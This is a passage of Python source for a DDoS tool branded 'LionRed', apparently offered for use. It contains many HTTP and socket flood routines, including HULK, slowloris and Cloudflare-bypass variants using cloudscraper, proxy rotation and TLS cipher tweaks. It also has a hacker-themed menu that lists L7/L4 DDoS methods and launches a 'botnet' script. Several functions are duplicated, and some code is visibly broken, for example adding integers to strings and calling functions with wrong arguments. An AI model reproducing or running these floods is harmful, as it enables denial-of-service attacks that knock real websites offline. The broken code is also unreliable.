            s.connect((str(target['target']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


# region CFB
def LaunchCFB(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(target, until, scraper))
            thd.start()
        except:
            pass


def AttackCFB(target, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(target, timeout=15)
            scraper.get(target, timeout=15)
        except:
            pass


# endregion

# region PXCFB
def LaunchPXCFB(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(target, until, scraper))
            thd.start()
        except:
            pass


def AttackPXCFB(target, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                'http': 'http://' + str(random.choice(list(proxies))),
                'https': 'http://' + str(random.choice(list(proxies))),
            }
            scraper.get(target, proxies=proxy)
            scraper.get(target, proxies=proxy)
        except:
            pass


# endregion

# region CFPRO
def LaunchCFPRO(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(target, until, scraper))
            thd.start()
        except:
            pass


def AttackCFPRO(target, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(target=target, headers=headers, allow_redirects=False)
            scraper.get(target=target, headers=headers, allow_redirects=False)
        except:
            pass


# endregion
#region CFPRO
def LaunchCFPRO(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(target, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(target, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(target=target, headers=headers, allow_redirects=False)
            scraper.get(target=target, headers=headers, allow_redirects=False)
        except:
            pass
#endregion
#hulk
def LaunchHULK(target, thread, t):
    target = get_target(target)
    user_agent = random.choice(useragents)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + target['uri']+"?" + random.randint(1,1000) + "=" + random.randint(1,1000)+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\nCache-Control: no-cache\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackHULK, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackHULK(target, until_datetime, req):
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        ctx = ssl.create_default_context()
        cipher = (':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK')
        ctx.set_ciphers(cipher)
        s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion
#slowloris

def attackslow(target, thread, t):
    for i in range(int(thread)):
        threading.Thread(target=Launchslow, args=(target, t)).start()
        
def Launchslow(target, t):
    socksCrawler() 
    prox = open("./proxy.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(t)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(target).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
            s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
            s.send(("Connection:keep-alive").encode("utf-8"))
            while True:
                time.sleep(14)
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except:
            s.close()
            Launchslow()
#endregion
#gbp
def attackbypass(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchbypass, args=(target, t)).start()

def Launchbypass(target, t):
    prox = open("./proxy.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(t)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
def attackSTELLAR(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(target, t)).start()

def LaunchSTELLAR(target, tr):
    timelol = time.time() + int(t) 
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

#region CFB
def LaunchCFB(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(target, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(target, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
     for _ in range(100):
        try:
            scraper.get(target, timeout=5)
            scraper.post(target, timeout=5)
            scraper.head(target, timeout=5)
        except:
            pass
#endregion

#getCOOOKIE

def attackPXCFB(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchPXCFB, args=(target, t)).start()

def LaunchPXCFB(target, t):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(t)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.3\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.create_default_context()
            cipher = [':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK']
            ctx.set_ciphers(cipher)
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#region CFPRO
def LaunchCFPRO(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(target, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(target, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(targetl=target, headers=headers, allow_redirects=False)
            scraper.get(target=target, headers=headers, allow_redirects=False)
        except:
            pass
#endregion
#region
def LaunchCFSOC(target, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(target)
    cookie, user_agent = get_cookie(target)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target[4] == 's':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


#slowloris

# endregion

# region testzone
def attackLIONRED(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchLIONRED, args=(target, t)).start()


def LaunchLIONRED(target, t):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(t)
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(target).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            _=s.send(str.encode(req))
            try:
                for _ in range(100):
                    _=s.send(str.encode(req))
                    _=s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()


def attackSTELLAR(target, thread, t):
    for i in range(int(thread)):
        threading.Thread(target=LaunchSTELLAR, args=(target, t)).start()

def LaunchSTELLAR(target, t):
    timelol = time.time() + int(t) 
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()


# endregion



def test1(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(target)
    req = 'GET ' + target['target'] + ' HTTP/1.1\r\n'
    req += 'target: ' + target['target'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    # req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=test2, args=(until, target, req,))
            thd.start()
        except:
            pass


def test2(until_datetime, target, req):
    if target[4] == 's':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['target']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['target'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['target']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def dos(target):
        while True:
          try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)

          except requests.exceptions.ConnectionError:

            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")


# endregion

def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')



# Fancy ASCII watermark
wms = [
  '''
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            

  ''',
  
  '''
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            
       
  ''',

  '''
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            

  ''',

  '''
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            

  ''',

  '''
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            

  ''',

  '''                                         
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            

  ''',

  '''
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            
                            
''',
]

quotes = [
  # Author
'LionRed 2.2 LionTeamVN',
'LionRed 2.2 LionTeamVN',
  f'Hey, {pcpy.get_user()}!',
  f'Welcome back, {pcpy.get_user()}!',
'LionRed 2.2 LionTeamVN',
'LionRed 2.2 LionTeamVN',
  ':)',
  f'Hello, {pcpy.get_user()}.',
'LionRed 2.2 LionTeamVN',
'LionRed 2.2 LionTeamVN',
  f'Ну что, {pcpy.get_user()}...',
  f'{pcpy.get_user()}, кыш!',
'LionRed 2.2 LionTeamVN',
'LionRed 2.2 LionTeamVN',
'LionRed 2.2 LionTeamVN',
'LionRed 2.2 LionTeamVN',
]


# Functions that replaces built-in ones
def printf(txt, delay=0, end='\n', flush=True):
  txt = txt + end
  
  for letter in txt:

    print(letter, end='', flush=flush)
    
    time.sleep(delay)

def inputf():
    printf(Colorate.Vertical(Colors.purple_to_red, '''
  ╔═══[root@Blood]
  ╚══> ''', True), end=' ')
    
    return input().strip().lower()

def clr():
  os.system('cls' if os.name=='nt' else 'clear')



# Main function
def welcome():
  clr()
  
  printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
           ╦══╩═════════════Lion════════════════╩══╦
      {random.choice(wms)}
                                  — {random.choice(quotes)}
                                          
           ╩══╦══════════════o══════════════════╦══╩
    ╔═════════╩═════════════════════════════════╩═════════╗
                           LionRed Hacking 
      > methods              :         Show Methods L7/L4
      > Thans Use Tool       :         TeamLion Thanks
  
                https://zalo.me/0792161421
                           
    ╠═════════╦══════════════$══════════════════╦═════════╣
           ╦══╩═════════════════════════════════╩══╦

  '''), True), end='')

  checkExtraMethod()

  while True:
    cmdl = inputf()

    if 'credits' in cmdl:
      clr()
      
      printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
             ╦══╩══════════════0══════════════════╩══╦
        {random.choice(wms)}

                            TeamLionAdmin
             ╩══╦══════════════0══════════════════╦══╩
      ╔═════════╩═════════════════════════════════╩═════════╗
    
        ➡ coder                :       NNQLionAdmin
        ➡ idea                 :     VanTan2k5
        ➡ team                 :       LionTeam COPY
    
                  
                             
      ╠═════════╦══════════════$══════════════════╦═════════╣
             ╦══╩═════════════════════════════════╩══╦
      '''), True), end='')
    
    #elif 'fetch' in cmdl or 'info' in cmdl:
      #print(pcpy.fetch())

    elif 'methods' in cmdl:
      clr()
      
      printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
             ╦══╩══════════════</>══════════════════╩══╦
          {random.choice(wms)}

                            L7/L4 DDoS
             ╩══╦══════════════</>══════════════════╦══╩
      ╔═════════╩═══════════════TL══════════════════╩═════════╗          
    
        </> L4                   : Update SOS

        </> L7                   : lionddos, lionred 
                                 
                                 
                                 


      ╠═════════╦══════════════$══════════════════╦═════════╣
             ╦══╩═════════════════════════════════╩══╦
      '''), True), end='')
    elif 'tools' in cmdl:
        clr()
        printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
             ╦══╩══════════════0══════════════════╩══╦
          {random.choice(wms)}

                            TOOLS
             ╩══╦══════════════0══════════════════╦══╩
      ╔═════════╩═════════════════════════════════╩═════════╗          
    
        ➡ .proxy              :  get valid proxy
        ➡ .proxie             :  get all proxy
        ➡ dns                 :  Classic DNS Lookup
        ➡ subnet              :  Subnet IP Address Lookup
        ➡ geiop               :  Geo IP Address Lookup
      ╠═════════╦══════════════$══════════════════╦═════════╣
             ╦══╩═════════════════════════════════╩══╦
      '''), True), end='')

    elif 'root' in cmdl:
        global ip
        print(Back.GREEN+"Your ip: {}".format(ip)+Style.RESET_ALL)
        print(Back.GREEN+"Your ip is sent to the server." + Style.RESET_ALL)

    elif 'botnet' in cmdl:
        exec(open('sbot/main.py').read())

    elif 'help' in cmdl:
        clr()
        welcome()
        

    elif 'cfb' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif "pxcfb" in cmdl or 'PXCFB' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif "pps" in cmdl or 'PPS' in cmdl:
